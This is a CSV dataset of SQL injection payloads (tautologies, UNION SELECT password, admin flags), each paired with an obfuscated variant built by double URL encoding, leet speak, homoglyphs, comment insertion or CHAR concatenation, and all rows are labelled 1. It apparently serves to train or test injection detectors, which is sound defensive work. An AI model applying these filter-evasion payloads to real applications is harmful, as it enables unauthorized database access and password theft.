variant_id,original_payload,obfuscated_payload,technique,intensity,Label
OBF_00053,SELECT * FROM users,SELECT%2520%252A%2520FROM%2520users,double_encoding,high,1
OBF_00054,OR 1=1,°R 1=1,leet_speak,low,1
OBF_00055,OR 1=1,ØR 1=1,leet_speak,medium,1
OBF_00056,OR 1=1,ØR 1=1,leet_speak,high,1
OBF_00057,OR 1=1,ΟR 1=1,homoglyph,low,1
OBF_00058,OR 1=1,ОR 1=1,homoglyph,medium,1
OBF_00059,OR 1=1,ОƦ 1=1,homoglyph,high,1
OBF_00060,OR 1=1,O/**/R 1=1,comment_insertion,medium,1
OBF_00061,OR 1=1,"CHAR(79,82) 1=1",concatenation,high,1
OBF_00062,OR 1=1,OR%25201%253D1,double_encoding,high,1
OBF_00063,UNION SELECT password,μN1ON SELECT password,leet_speak,low,1
OBF_00064,UNION SELECT password,μN!ØN 53ŁECT password,leet_speak,medium,1
OBF_00065,UNION SELECT password,ƱN|°N 5€Ł€C+ pΛ§$wØrd,leet_speak,high,1
OBF_00066,UNION SELECT password,υNІON SELECT password,homoglyph,low,1
OBF_00067,UNION SELECT password,ՍNІＯN ŞЕLＥＣT password,homoglyph,medium,1
OBF_00068,UNION SELECT password,ՍNＩΟN ŞЕLＥϹＴ ΡАЅŞwＯƦd,homoglyph,high,1
OBF_00069,UNION SELECT password,UN/**/ION SEL/**/ECT passwO/**/Rd,comment_insertion,medium,1
OBF_00070,UNION SELECT password,"CHAR(85,78,73,79,78) SELECT password",concatenation,high,1
OBF_00071,UNION SELECT password,UNION%2520SELECT%2520password,double_encoding,high,1
OBF_00072,AND admin=1,ΛND admin=1,leet_speak,low,1
OBF_00073,AND admin=1,4ND admin=1,leet_speak,medium,1
OBF_00074,AND admin=1,4ND @dm|n=1,leet_speak,high,1
OBF_00075,AND admin=1,АND admin=1,homoglyph,low,1
OBF_00076,AND admin=1,АND admin=1,homoglyph,medium,1
OBF_00077,AND admin=1,ΑND ＡdmІn=1,homoglyph,high,1
OBF_00078,AND admin=1,A/**/ND admin=1,comment_insertion,medium,1
OBF_00079,AND admin=1,"CHAR(65,78,68) admin=1",concatenation,high,1
OBF_00080,AND admin=1,AND%2520admin%253D1,double_encoding,high,1
